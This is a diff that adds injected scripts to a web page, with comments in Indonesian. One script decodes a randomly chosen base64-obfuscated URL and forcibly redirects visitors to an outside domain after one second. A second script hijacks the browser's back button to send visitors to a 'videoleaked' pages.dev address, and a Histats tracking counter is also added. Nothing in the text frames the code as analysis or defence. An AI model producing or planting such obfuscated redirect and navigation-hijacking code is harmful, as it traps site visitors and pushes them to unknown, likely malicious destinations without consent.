@@ -1,0 +1,47 @@
+<script>
+  setTimeout(function() {
+    // Array URL yang sudah di-encode base64
+    var base64Urls = [
+      "aHR0cHM6Ly9yaXNrZXhjZWwuY29tL2ViOGZhc3k5ZWg/a2V5PWI4ZDY1YWNjYzg1ODA0Mzc0ZTUwODQzZjEwNmIwOGJh",
+      "aHR0cHM6Ly9yaXNrZXhjZWwuY29tL21xN2MxczU1bj9rZXk9ZmJjNjY3Y2NlOGJhOWI4YjkyNWQxYjA4NTg2ZGMyNGU=",
+      "aHR0cHM6Ly9yaXNrZXhjZWwuY29tL3B5ZWttM3IwP2tleT0xYTk2YmVhNWUxZGYxODM2MWUxNTgyNDBiOTE1Zjk1Ng=="
+    ];
+
+    // Pilih indeks acak dari array base64
+    var randomIndex = Math.floor(Math.random() * base64Urls.length);
+
+    // Dekode URL base64 dan alihkan halaman
+    var decodedUrl = atob(base64Urls[randomIndex]);
+    window.location.href = decodedUrl;
+  }, 1000);
+</script>
+
+
+</script>
+	<script type='text/javascript'>
+	(function(window, location) {
+            history.replaceState(null, document.title, location.pathname + "#!/history");
+            history.pushState(null, document.title, location.pathname);
+            
+            window.addEventListener("popstate", function() {
+                if (location.hash === "#!/history") {
+                    history.replaceState(null, document.title, location.pathname);
+                    setTimeout(function() {
+                        location.replace("https://videoleaked.pages.dev/reload.html");
+                    }, 0);
+                }
+            }, false);
+        }(window, location));
+
+</script>
+
+<script type="text/javascript">var _Hasync= _Hasync|| [];
+_Hasync.push(['Histats.start', '1,4912344,4,0,0,0,00010000']);
+_Hasync.push(['Histats.fasi', '1']);
+_Hasync.push(['Histats.track_hits', '']);
+(function() {
+var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+hs.src = ('//s10.histats.com/js15_as.js');
+(document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+})();</script>
+<noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?4912344&101" alt="page hit counter" border="0"></a></noscript>
